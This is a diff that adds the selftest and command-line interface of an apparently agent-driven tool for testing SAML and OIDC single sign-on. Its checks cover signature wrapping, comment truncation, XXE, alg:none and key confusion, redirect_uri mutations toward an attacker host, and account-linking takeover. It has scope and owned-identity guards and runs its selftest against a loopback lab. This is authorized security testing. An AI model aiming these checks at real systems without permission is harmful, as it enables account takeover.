+    # --- redirect_uri table
+    muts = dict((label, value) for label, value, _ in
+                redirect_mutations("https://app.example/cb", "oast.mythos.lab"))
+    eq(muts["exact"], "https://app.example/cb", "the exact value is the control row")
+    ok(muts["path-suffix"].startswith("https://app.example/cb/"),
+       "the suffix mutation keeps the registered prefix")
+    ok("%23" in muts["fragment-encoded"], "the %23 trick is encoded")
+    ok(muts["userinfo"].startswith("https://app.example@"),
+       "the userinfo mutation puts the registered host before the @")
+    ok(muts["unrelated"] == "https://oast.mythos.lab/cb",
+       "the unrelated-host control is the attacker host outright")
+    ok("mythos-app://" in muts["scheme-custom"], "a non-registered scheme is tried")
+    ok(len(set(muts.values())) == len(muts), "every mutation is distinct")
+    eq(authorize_url("https://as/authorize?x=1", {"client_id": "c", "state": None}),
+       "https://as/authorize?x=1&client_id=c",
+       "authorize_url keeps existing query parameters and drops None")
+
+    # --- verdict vocabulary
+    held = judge({"status": 403}, {}, True, "bob")
+    ok(held.startswith("held"), "a refusal with a working control reads as held")
+    inc = judge({"status": 403}, {}, False, "bob")
+    ok(inc.startswith("inconclusive") and "control" in inc,
+       "a refusal without a working control is inconclusive")
+    cand = judge({"status": 200}, {"matched": True, "session_cookie": "a=b"}, True, "bob")
+    ok(cand.startswith("candidate") and "bob" in cand,
+       "an oracle match is a candidate naming the identity")
+    weak = judge({"status": 200}, {"session_cookie": "a=b", "oracle_url": None},
+                 True, "bob")
+    ok("candidate (weak)" in weak, "a session with no oracle is only a weak candidate")
+    ok(judge({"status": None, "body": "refused"}, {}, True, "b").startswith("inconclusive"),
+       "a failed request is not a verdict")
+    for fn, args in ((judge, ({"status": 200}, {"matched": True}, True, "b")),
+                     (judge, ({"status": 403}, {}, True, "b"))):
+        ok("confirmed" not in fn(*args),
+           "no verdict in this file is ever `confirmed`")
+
+    # --- live: the loopback SP/RP
+    import tempfile
+    lab = _Lab()
+    scope_dir = tempfile.TemporaryDirectory()
+    scope = pathlib.Path(scope_dir.name) / "scope.yaml"
+    scope.write_text(f"target: http://127.0.0.1:{lab.port}\nin_scope:\n"
+                     f"  - 127.0.0.1\nports: [{lab.port}]\n"
+                     f"rules:\n  rate_limit_rps: 200\n")
+    prev = os.environ.get("MYTHOS_SCOPE")
+    os.environ["MYTHOS_SCOPE"] = str(scope)
+    _GAP[0] = 0.0
+    try:
+        # scope: an out-of-scope IdP is refused, by name, before any request
+        try:
+            require_in_scope("https://idp.somebody-elses-tenant.test/sso")
+            fails.append("an out-of-scope IdP was NOT refused")
+        except SystemExit as e:
+            ok("out of scope" in str(e) and "idp.somebody-elses-tenant.test" in str(e),
+               "an out-of-scope IdP is refused and named")
+
+        a = _Args(acs=lab.url("/saml/acs"), subject="alice@mythos.lab",
+                  victim="bob@mythos.lab", own=OWN, timeout=5, insecure=False,
+                  oracle_url=lab.url("/whoami"), key=None, sign="assertion",
+                  only=["unsigned", "comment-nameid", "replay", "doctype",
+                        "xxe-internal", "idp-initiated"],
+                  keep_documents=False)
+        res = cmd_saml(a)
+        eq(res["control"]["ok"], True,
+           "the negative control succeeds against the loopback SP")
+        eq(res["control"]["read_back"]["matched"], True,
+           "and the control's session reads back as the subject we asserted")
+        got = {r["check"]: r for r in res["rows"]}
+        ok(got["unsigned"]["verdict"].startswith("candidate"),
+           "the loopback SP accepts an unsigned assertion, as built")
+        ok("bob@mythos.lab" in got["unsigned"]["verdict"],
+           "and the verdict names the identity it read back")
+        ok(got["comment-nameid"]["verdict"].startswith("candidate"),
+           "the comment truncation lands: the SP read the text before the comment")
+        ok("bob@mythos.lab" in (got["comment-nameid"]["read_back"]["identity_seen"] or ""),
+           "and the session subject is the truncated address, not the full one")
+        ok(".evil.invalid" not in
+           json.loads(got["comment-nameid"]["read_back"]["identity_seen"])["subject"],
+           "the suffix after the comment did not reach the session")
+        ok(got["comment-nameid"]["control_after"]["still_ok"],
+           "the control still works after the hit")
+        ok(got["replay"]["verdict"].startswith("candidate"),
+           "an assertion replayed to an SP with no replay cache is a candidate")
+        ok("MYTHOS-ENTITY-RESOLVED" in (got["xxe-internal"]["response_head"] or "")
+           or got["xxe-internal"]["verdict"].startswith(("candidate", "held")),
+           "the internal-entity row is graded one way or the other")
+
+        # the signature-present ACS: unsigned must be refused there, and the
+        # negative control must still succeed. Both halves, or neither means
+        # anything.
+        b = _Args(acs=lab.url("/saml/acs-sigpresent"), subject="alice@mythos.lab",
+                  victim="bob@mythos.lab", own=OWN, timeout=5, insecure=False,
+                  oracle_url=lab.url("/whoami"), key=None, sign="assertion",
+                  only=["unsigned", "xsw4"], keep_documents=False)
+        res2 = cmd_saml(b)
+        eq(res2["control"]["ok"], True,
+           "the control succeeds against the signature-present ACS too")
+        got2 = {r["check"]: r for r in res2["rows"]}
+        ok(got2["unsigned"]["verdict"].startswith("held"),
+           "the signature-present ACS refuses the unsigned assertion")
+        ok(got2["xsw4"]["verdict"].startswith("candidate"),
+           "XSW4 beats a last-NameID reader that only checks a signature exists")
+
+        # a control that cannot succeed makes every row inconclusive
+        c = _Args(acs=lab.url("/saml/nope"), subject="alice@mythos.lab",
+                  victim="bob@mythos.lab", own=OWN, timeout=5, insecure=False,
+                  only=["unsigned"], keep_documents=False, sign="assertion")
+        res3 = cmd_saml(c)
+        eq(res3["control"]["ok"], False, "a dead ACS gives no control")
+        ok(res3["rows"][0]["verdict"].startswith("inconclusive"),
+           "and every row is inconclusive rather than `held`")
+
+        # oidc: the substring redirect_uri match and the plain PKCE advert
+        d = _Args(authorize=lab.url("/oauth/authorize"), client_id="c",
+                  redirect_uri="http://127.0.0.1:9/cb", own=OWN, timeout=5,
+                  insecure=False, scope="openid", oast="127.0.0.1",
+                  metadata=lab.url("/.well-known/openid-configuration"),
+                  only=["exact", "unrelated", "path-suffix", "subdomain",
+                        "pkce-plain", "prompt-none"], account="alice@mythos.lab")
+        res4 = cmd_oidc(d)
+        eq(res4["control"]["ok"], True, "the oidc control redirect happens")
+        rr = {r["check"]: r for r in res4["redirect_uri_rows"]}
+        ok(rr["redirect_uri/path-suffix"]["verdict"].startswith("candidate"),
+           "a path suffix is accepted by a substring matcher")
+        ok(rr["redirect_uri/path-suffix"]["has_code"],
+           "and the Location carries a code")
+        ok(any("plain" in f for f in res4["metadata"]["facts"]),
+           "advertising PKCE `plain` is called out from the discovery document")
+        fr = {r["check"]: r for r in res4["flow_rows"]}
+        ok(fr["prompt-none"]["verdict"].startswith("candidate"),
+           "prompt=none issuing a code silently is a candidate")
+
+        # idtoken / linking against the link endpoint that checks nothing
+        good = make_jwt({"alg": "HS256", "typ": "JWT"},
+                        {"sub": "s1", "email": "alice@mythos.lab",
+                         "email_verified": True, "aud": "c"}, b"k")[0]
+        e = _Args(link_url=lab.url("/oidc/link"), own=OWN, timeout=5,
+                  insecure=False, field="id_token", local_email="alice@mythos.lab",
+                  second_email="bob@mythos.lab", issuer="https://idp.mythos.lab",
+                  client_id="c", id_token=good, oracle_url=lab.url("/whoami"),
+                  oracle_match="alice@mythos.lab",
+                  unlink_url=lab.url("/oidc/unlink"), keep_tokens=False,
+                  account="alice@mythos.lab", hmac_key="k")
+        res5 = cmd_linking(e)
+        eq(res5["control"]["ok"], True, "the link control succeeds")
+        lr = {r["check"]: r for r in res5["rows"]}
+        ok(lr["unverified-email"]["verdict"].startswith("candidate"),
+           "an unverified email linking to an existing account is a candidate")
+        ok(lr["idp-collision"]["verdict"].startswith("candidate"),
+           "two issuers on one email collide into one account")
+        ok(lr["stale-session"]["verdict"].startswith("candidate"),
+           "a session that survives the unlink is a candidate")
+
+        f = _Args(rp_url=lab.url("/oidc/link"), own=OWN, timeout=5, insecure=False,
+                  field="id_token", id_token=good, victim_email="bob@mythos.lab",
+                  oracle_url=lab.url("/whoami"), oracle_match="bob@mythos.lab",
+                  account="alice@mythos.lab", keep_tokens=False,
+                  access_token="MYTHOS_LAB_CANARY_at." + b64u(
+                      json.dumps({"email": "bob@mythos.lab"}).encode()) + ".x",
+                  only=["alg-none", "aud-confusion", "token-substitution",
+                        "jku-pointing-elsewhere"])
+        res6 = cmd_idtoken(f)
+        eq(res6["control"]["ok"], True, "the idtoken control succeeds")
+        ir = {r["check"]: r for r in res6["rows"]}
+        ok(ir["alg-none"]["verdict"].startswith("candidate"),
+           "alg:none is accepted by a relying party that does not verify")
+        ok(ir["jku-pointing-elsewhere"]["verdict"].startswith("inconclusive")
+           and "--jwks-host" in ir["jku-pointing-elsewhere"]["verdict"],
+           "without a jwks host the jku row is inconclusive and names the flag "
+           "that is missing, rather than blaming RSA for it")
+        ok(any(r.get("rsa_not_covered") for r in cmd_idtoken(_Args(
+               rp_url=lab.url("/oidc/link"), own=OWN, timeout=5, insecure=False,
+               field="id_token", id_token=good, victim_email="bob@mythos.lab",
+               account="alice@mythos.lab", only=["hs-confusion"]))["rows"]),
+           "the HS-confusion row says rsa_not_covered when no --hmac-key is given")
+
+        # metadata, read only
+        g = _Args(url=lab.url("/saml/metadata"), own=OWN, timeout=5, insecure=False)
+        res7 = cmd_metadata(g)
+        doc = res7["documents"][0]
+        eq(len(doc["certificates"]), 1, "the one published certificate is read")
+        ok(any("WantAssertionsSigned=false" in f for f in doc["facts"]),
+           "metadata that does not want signed assertions is called out")
+
+        # shapes: no request at all
+        before = _SENT[0]
+        h = _Args(own=OWN, subject="alice@mythos.lab", victim="bob@mythos.lab",
+                  acs="https://sp.invalid/acs", sign="both", only=None)
+        res8 = cmd_shapes(h)
+        eq(_SENT[0], before, "`shapes` sends nothing")
+        eq(len([s for s in res8["shapes"] if s["ok"]]), 8,
+           "`shapes` builds all eight")
+    finally:
+        lab.close()
+        if prev is None:
+            os.environ.pop("MYTHOS_SCOPE", None)
+        else:
+            os.environ["MYTHOS_SCOPE"] = prev
+        scope_dir.cleanup()
+
+    for f in fails:
+        print(f"FAIL {f}")
+    print(f"federation selftest: {len(fails)} failure(s)")
+    return 1 if fails else 0
+
+# ------------------------------------------------------------------ cli
+
+
+def kv(pairs):
+    out = {}
+    for p in pairs or []:
+        k, _, v = p.partition(":")
+        out[k.strip()] = v.strip()
+    return out
+
+
+def build_parser():
+    ap = argparse.ArgumentParser(
+        prog="federation", description=__doc__,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--selftest", action="store_true",
+                    help="same as the `selftest` subcommand")
+
+    common = argparse.ArgumentParser(add_help=False)
+    common.add_argument("--json", action="store_true", help="machine-readable output")
+    common.add_argument("--timeout", type=float, default=10)
+    common.add_argument("--insecure", action="store_true", help="skip TLS verification")
+    common.add_argument("--rate", type=float, default=None,
+                        help="requests per second; default is rules.rate_limit_rps "
+                             "from $MYTHOS_SCOPE, else 5")
+    common.add_argument("--only", action="append", default=None,
+                        help="run only this check, repeatable (see the output "
+                             "of a full run for the names)")
+
+    owned = argparse.ArgumentParser(add_help=False)
+    owned.add_argument("--own", action="append", default=[], required=True,
+                       help="an identity (email, NameID, sub) the operator owns. "
+                            "REPEATABLE AND REQUIRED: every identity this run "
+                            "asserts is checked against this list and a foreign "
+                            "one is refused before any request.")
+
+    sub = ap.add_subparsers(dest="cmd")
+
+    s = sub.add_parser("saml", parents=[common, owned],
+                       help="post SAML assertion mutations to an ACS: unsigned, "
+                            "XSW1-XSW8, comment truncation, the four bindings, "
+                            "time, replay, IdP-initiated, DTD and XXE",
+                       description="One POST per mutation to the SP's assertion "
+                                   "consumer service, with the unmodified "
+                                   "document as the control before and after.")
+    s.add_argument("acs", help="the assertion consumer service URL (POST binding)")
+    s.add_argument("--subject", required=True,
+                   help="the NameID the control asserts: YOUR first account")
+    s.add_argument("--victim", help="the NameID the mutations assert: YOUR second "
+                                    "account (default: --subject)")
+    s.add_argument("--response", help="a SAMLResponse YOU captured from your own "
+                                      "login (file: raw XML, base64, or base64 of "
+                                      "deflate). Without it the document is minted "
+                                      "and signed with an HMAC test key.")
+    s.add_argument("--key", help="hex HMAC key for the minted signature")
+    s.add_argument("--sign", choices=["assertion", "response", "both", "none"],
+                   default="assertion", help="what the minted document signs")
+    s.add_argument("--audience", help="Audience for the minted document")
+    s.add_argument("--destination", help="Destination for the minted document")
+    s.add_argument("--in-response-to", help="InResponseTo for the minted document")
+    s.add_argument("--idp", help="the IdP host, so it is scope-checked here too")
+    s.add_argument("--oast", help="an OAST host YOU control, for the external-entity row")
+    s.add_argument("--xxe-file", help="a local path on the target to read with a "
+                                      "file entity; omitted means no file is read")
+    s.add_argument("--relay-state", help="a URL to put in RelayState, for the "
+                                         "IdP-initiated redirect row")
+    s.add_argument("--oracle-url", help="an endpoint that names the logged-in "
+                                        "identity, read with the session the ACS "
+                                        "issued. Without it no row gets better "
+                                        "than a weak candidate.")
+    s.add_argument("--oracle-match", help="the string in that endpoint's answer "
+                                          "that proves the identity")
+    s.add_argument("--keep-documents", action="store_true",
+                   help="put every document sent in the --json output (large)")
+    s.set_defaults(fn=cmd_saml)
+
+    h = sub.add_parser("shapes", parents=[common, owned],
+                       help="print what each XSW shape builds; sends nothing",
+                       description="The eight wrapping documents and the "
+                                   "measurable facts about each, for a finding "
+                                   "attachment or a diff. No requests.")
+    h.add_argument("--response", help="a capture to wrap (see `saml --response`)")
+    h.add_argument("--subject",
+                   help="the NameID of the minted base document (default: the "
+                        "first --own entry)")
+    h.add_argument("--victim", required=True, help="the NameID the evil copy asserts")
+    h.add_argument("--acs", help="ACS URL for the minted base document")
+    h.add_argument("--sign", choices=["assertion", "response", "both"],
+                   default="both", help="what the minted base document signs")
+    h.set_defaults(fn=cmd_shapes)
+
+    m = sub.add_parser("metadata", parents=[common],
+                       help="read SP/IdP metadata or a JWKS and say what key "
+                            "rotation would do here",
+                       description="GET only. Certificates, their digests, "
+                                   "JWKS key ids, WantAssertionsSigned and the "
+                                   "cache headers that decide how long a "
+                                   "retired key stays trusted.")
+    m.add_argument("url", help="metadata or JWKS URL")
+    m.add_argument("--also", action="append", default=[],
+                   help="another metadata URL to read in the same run, repeatable")
+    m.set_defaults(fn=cmd_metadata)
+
+    o = sub.add_parser("oidc", parents=[common, owned],
+                       help="authorization-endpoint checks: redirect_uri "
+                            "matching, state, PKCE downgrade, response_type and "
+                            "response_mode downgrade, prompt=none",
+                       description="One authorization request per mutation, "
+                                   "redirects not followed, with the registered "
+                                   "redirect_uri as the control and an unrelated "
+                                   "host as the table's own control.")
+    o.add_argument("authorize", help="the authorization endpoint")
+    o.add_argument("--client-id", required=True)
+    o.add_argument("--redirect-uri", required=True, help="the REGISTERED value")
+    o.add_argument("--account", required=True,
+                   help="the account this flow is for; must be on --own")
+    o.add_argument("--scope", default="openid profile email")
+    o.add_argument("--oast", help="a host YOU control, used as the attacker host "
+                                  "in the mutation table (scope-checked)")
+    o.add_argument("--metadata", help="the discovery document URL")
+    o.add_argument("--header", action="append", default=[],
+                   help="'Name: value' sent with every request, e.g. the AS "
+                        "session cookie; repeatable")
+    o.set_defaults(fn=cmd_oidc)
+
+    t = sub.add_parser("token", parents=[common, owned],
+                       help="token-endpoint checks: code reuse, redirect and "
+                            "client rebinding, PKCE verifier enforcement, code "
+                            "injection, and whether a rate limit exists",
+                       description="Each row is one redemption of a code YOU "
+                                   "captured. Nothing guesses a code; the "
+                                   "rate-limit row sends at most 10 wrong ones "
+                                   "and reports the ceiling.")
+    t.add_argument("token_url", help="the token endpoint")
+    t.add_argument("--client-id", required=True)
+    t.add_argument("--client-secret")
+    t.add_argument("--code", required=True, help="a code YOUR flow just received")
+    t.add_argument("--redirect-uri")
+    t.add_argument("--verifier", help="the correct PKCE code_verifier")
+    t.add_argument("--account", required=True, help="must be on --own")
+    t.add_argument("--other-redirect", help="another redirect_uri for the rebinding row")
+    t.add_argument("--other-client", help="another client_id for the rebinding row")
+    t.add_argument("--injected-code", help="a code issued to a SECOND client of "
+                                           "the same AS, both yours")
+    t.add_argument("--limit-probe", type=int, default=0,
+                   help="wrong codes for the rate-limit row, hard-capped at 10 "
+                        "(0 = skip it)")
+    t.set_defaults(fn=cmd_token)
+
+    i = sub.add_parser("idtoken", parents=[common, owned],
+                       help="id_token checks at a relying party: alg:none, "
+                            "HS/RS confusion, audience confusion, nonce replay, "
+                            "token substitution, kid/jku/x5u",
+                       description="Each row presents one token to the endpoint "
+                                   "that consumes id_tokens, with the captured "
+                                   "token unmodified as the control. RS256 "
+                                   "forgery is outside the standard library and "
+                                   "those rows say so.")
+    i.add_argument("rp_url", help="the relying party endpoint that consumes an id_token")
+    i.add_argument("--id-token", required=True,
+                   help="an id_token YOUR OWN account received")
+    i.add_argument("--account", required=True, help="must be on --own")
+    i.add_argument("--field", default="id_token", help="the field name to send it in")
+    i.add_argument("--extra-field", action="append", default=[],
+                   help="name=value also required by the POST, repeatable")
+    i.add_argument("--victim-sub", help="the `sub` the mutations assert: YOURS")
+    i.add_argument("--victim-email", help="the `email` the mutations assert: YOURS")
+    i.add_argument("--hmac-key", help="the secret for the HS-confusion and kid "
+                                      "rows, usually the IdP's RSA public key "
+                                      "or the JWKS `n` value")
+    i.add_argument("--other-issuer", help="an issuer value for the iss-swap row")
+    i.add_argument("--other-rp", help="a SECOND relying party of yours, for the "
+                                      "audience-confusion row")
+    i.add_argument("--jwks-host", help="a host YOU control for jku/x5u (scope-checked)")
+    i.add_argument("--access-token", help="an access token of yours, for the "
+                                          "token-substitution row")
+    i.add_argument("--oracle-url", help="an endpoint that names the logged-in identity")
+    i.add_argument("--oracle-match", help="the string that proves the identity")
+    i.add_argument("--keep-tokens", action="store_true",
+                   help="put every token sent in the --json output")
+    i.set_defaults(fn=cmd_idtoken)
+
+    l = sub.add_parser("linking", parents=[common, owned],
+                       help="account linking: an unverified email from an IdP, "
+                            "two IdPs on one email, a pre-registered account "
+                            "claimed, a session that survives unlinking",
+                       description="Both accounts are the operator's. The "
+                                   "control is the link flow as the application "
+                                   "intends it, and without a real captured "
+                                   "--id-token a signature-checking relying "
+                                   "party will refuse every row, which the "
+                                   "output then says.")
+    l.add_argument("link_url", help="the endpoint that links an IdP identity to "
+                                    "a local account")
+    l.add_argument("--account", required=True, help="must be on --own")
+    l.add_argument("--local-email", required=True,
+                   help="the address of YOUR existing local account")
+    l.add_argument("--second-email", help="YOUR second address, for the "
+                                          "pre-registration row")
+    l.add_argument("--issuer", default="https://idp.mythos.lab",
+                   help="the `iss` the minted tokens claim")
+    l.add_argument("--other-issuer", help="a second `iss`, for the collision row")
+    l.add_argument("--client-id", default="mythos", help="the `aud` the tokens claim")
+    l.add_argument("--own-sub", help="the `sub` of YOUR IdP identity")
+    l.add_argument("--nonce", help="the nonce this flow sent")
+    l.add_argument("--id-token", help="a real captured id_token, so the control "
+                                      "can succeed against a relying party that "
+                                      "verifies signatures")
+    l.add_argument("--hmac-key", help="HS256 key for the minted tokens")
+    l.add_argument("--field", default="id_token")
+    l.add_argument("--extra-field", action="append", default=[])
+    l.add_argument("--unlink-url", help="the endpoint that disconnects the identity")
+    l.add_argument("--oracle-url", help="an endpoint that names the logged-in identity")
+    l.add_argument("--oracle-match", help="the string that proves the identity")
+    l.add_argument("--keep-tokens", action="store_true")
+    l.set_defaults(fn=cmd_linking)
+
+    st = sub.add_parser("selftest", help="live asserts against a loopback SP/RP "
+                                         "this command starts itself")
+    st.add_argument("--json", action="store_true", help="accepted and ignored")
+    st.set_defaults(fn=None)
+    return ap
+
+
+def main():
+    ap = build_parser()
+    a = ap.parse_args()
+    if a.selftest or getattr(a, "cmd", None) == "selftest":
+        return _selftest()
+    if not getattr(a, "cmd", None):
+        ap.print_help()
+        return 2
+    if getattr(a, "header", None) is not None:
+        a.header = kv(a.header)
+    rate = scope_rate() if getattr(a, "rate", None) is None else a.rate
+    _GAP[0] = 1.0 / rate if rate and rate > 0 else 0.0
+    res = a.fn(a)
+    print(json.dumps(res, indent=1) if a.json else render(res))
+    if _SENT[0]:
+        print(f"\n({_SENT[0]} request(s) sent at <= {rate}/s)", file=sys.stderr)
+    # 0: nothing to look at. 3: at least one candidate, which is what the agent
+    # branches on. 2 is argparse's own usage error and stays that.
+    return 3 if any("candidate" in str(r.get("verdict", ""))
+                    for key in ("rows", "redirect_uri_rows", "flow_rows", "shapes")
+                    for r in (res.get(key) or [])) else 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
